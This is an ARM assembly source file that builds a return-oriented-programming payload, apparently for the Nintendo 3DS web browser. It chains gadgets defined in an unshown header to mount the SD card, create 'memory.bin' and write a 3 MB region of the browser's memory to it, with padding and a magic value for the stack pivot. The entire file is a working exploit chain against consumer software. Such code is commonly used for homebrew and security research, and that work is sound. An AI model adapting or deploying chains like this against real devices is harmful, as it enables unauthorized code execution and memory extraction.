	.arm
	.text

#include "spider_rop.h"

#define DUMPSTART 	0x00100000
#define DUMPSIZE	0x00300000

	.global	_start
@---------------------------------------------------------------------------------
_start:
	@ mount SD
		.word POP_R0_PC, DMC
		.word FS_MOUNTSDMC_LDMFD_SP_R3_4_5_PC, GARBAGE, GARBAGE, GARBAGE
	@ open file
		.word POP_R0_1_2_3_4_7_PC, THIS, SPIDER_ROP_LOC+FileName, FILE_WRITE | FILE_CREATE, GARBAGE, GARBAGE, GARBAGE
		.word IFile_Open_LDMFD_SP_R4_5_6_7_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE
		.word POP_PC
	@ read memory
		.word POP_R0_1_2_3_4_7_PC, THIS, THIS+0x20, DUMPSTART, DUMPSIZE, GARBAGE, GARBAGE
		.word IFile_Write_LDMFD_SP_R4_5_6_7_8_9_10_11_PC, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE, GARBAGE
	@ exit

	.fill 26, 4, GARBAGE
	.word SPIDER_ROP_LOC+_start+0x8C
	.fill 12, 4, GARBAGE
	.word SPIDER_ROP_LOC+_start, GARBAGE, POP_PC
	.fill 9, 4, GARBAGE
	.word POP_PC, POP_PC
FileName:
	.string16 "dmc:/memory.bin"
	.fill 78, 2, 0
	.word MAGIC
